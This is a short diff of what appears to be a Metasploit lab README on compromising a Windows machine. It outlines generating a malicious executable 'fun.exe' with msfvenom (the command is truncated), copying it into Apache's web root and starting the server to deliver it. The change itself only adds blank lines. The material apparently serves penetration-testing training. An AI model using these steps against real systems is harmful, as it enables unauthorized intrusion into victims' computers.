@@ -32,6 +32,8 @@ Create a malicious executable file fun.exe using msenom command msfvenom -p wind
 the fun.exe into the apache /var/www/html folder
 
 ![image](https://github.com/Shobika187/Compromising-windows-using-Metasploit/assets/94508142/83f50d9d-f2f6-49ae-ba7d-8fb2594795c3)
+
+
 Start apache server sudo systemctl apache2 start
 ![image](https://github.com/Shobika187/Compromising-windows-using-Metasploit/assets/94508142/b7fb41ee-baa5-4874-9523-2a3b95bcd198)
 Check the status of apache2
